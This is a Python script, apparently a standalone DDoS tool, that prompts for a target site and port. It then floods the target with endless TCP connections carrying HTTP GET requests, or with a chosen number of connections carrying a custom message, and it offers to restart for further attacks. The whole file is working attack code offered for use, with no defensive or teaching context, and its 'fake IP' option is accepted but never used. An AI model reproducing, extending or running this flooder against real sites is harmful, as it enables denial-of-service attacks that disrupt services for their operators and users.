import threading
import socket
import time
import os
import sys

def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)

# DDoS function for sending HTTP requests
def attack_http(target, port, fake_ip):
    already_connected = 0
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()

            already_connected += 1
            if already_connected % 500 == 0:
                print("HTTP - Connections:", already_connected)
        except Exception as e:
            print("HTTP - Error:", e)

# DDoS function for sending custom messages
def attack_custom(target, port, message, conn):
    ip = socket.gethostbyname(target)
    print("[Target IP:", ip, "]")

    for i in range(conn):
        try:
            ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ddos.connect((target, port))
            ddos.send(message.encode())
            ddos.close()
            print("Custom - Connection:", i+1)
        except Exception as e:
            print("Custom - Error:", e)

def main():
    print("DDoS mode loaded")
    print("Python script made by an0nymous_nl twitter")

    target = input("Site you want to DDoS: ")
    port = int(input("Port you want to attack: "))
    choice = input("Choose attack type (HTTP/Custom): ")

    if choice.lower() == "http":
        fake_ip = input("Enter fake IP address: ")
        threading.Thread(target=attack_http, args=(target, port, fake_ip)).start()
    elif choice.lower() == "custom":
        message = input("Input the message you want to send: ")
        conn = int(input("How many connections you want to make: "))
        threading.Thread(target=attack_custom, args=(target, port, message, conn)).start()
    else:
        print("Invalid choice.")

    while True:
        answer = input("Do you want to perform another DDoS attack? (yes/no): ")
        if answer.lower() in ["yes", "y"]:
            restart_program()
        elif answer.lower() in ["no", "n"]:
            sys.exit("Exiting DDoS script.")
        else:
            print("Invalid input. Please enter 'yes' or 'no'.")

if __name__ == "__main__":
    main()
